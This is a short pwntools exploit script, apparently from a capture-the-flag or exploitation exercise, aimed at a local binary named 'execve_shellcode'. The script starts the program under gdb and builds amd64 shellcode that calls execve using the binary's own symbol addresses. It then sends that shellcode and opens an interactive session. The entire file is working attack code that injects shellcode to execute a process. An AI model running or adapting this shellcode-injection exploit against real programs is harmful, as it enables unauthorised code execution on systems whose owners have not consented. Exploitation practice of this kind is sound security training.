from pwn import*

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"

e = ELF("./execve_shellcode", checksec=False)
p = gdb.debug("./execve_shellcode", '''
b *(main + 102)
continue
''')
p.recvuntil(b"exec!\n")

# leverage pwntools ELF to find the symbol addresses for us and input
# as a format string
s = asm('''
mov rdx, 0x0
lea rdi, [{}]
lea rax, [{}]
mov qword ptr [rax], rdi
mov qword ptr [rax + 8], 0x0
mov rsi, rax
mov rax, 0x3b
syscall
'''.format(e.symbols.str, e.symbols.two_quadwords))

p.send(s)

p.interactive()
